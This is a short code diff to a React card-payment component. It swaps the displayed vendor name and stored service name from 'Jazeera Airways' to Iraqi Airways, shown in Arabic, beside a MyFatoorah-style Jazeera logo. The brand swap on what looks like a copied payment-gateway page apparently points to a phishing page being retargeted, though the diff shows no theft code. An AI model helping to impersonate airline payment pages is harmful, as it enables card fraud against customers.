@@ -319,7 +319,7 @@ export default function CreditCardPayment() {
     localStorage.setItem("paymentData", JSON.stringify({
       cardLast4: cleanNumber.slice(-4),
       totalPaid: payCur.code + " " + displayAmountStr,
-      serviceName: "Jazeera Airways",
+      serviceName: "الخطوط الجوية العراقية",
       bankName: bankInfo?.bank || "Unknown",
       bankLogo: bankInfo?.logo || null,
       cardType,
@@ -563,7 +563,7 @@ export default function CreditCardPayment() {
                 <img alt="logo" className="mfi-logo" src="/images/myfatoorah_jazeera_logo_20.png" />
               </div>
               <span className="mfi-vendor-name">
-                Jazeera Airways KWD
+                الخطوط الجوية العراقية KWD
               </span>
             </div>
             <div className="mfi-lang">
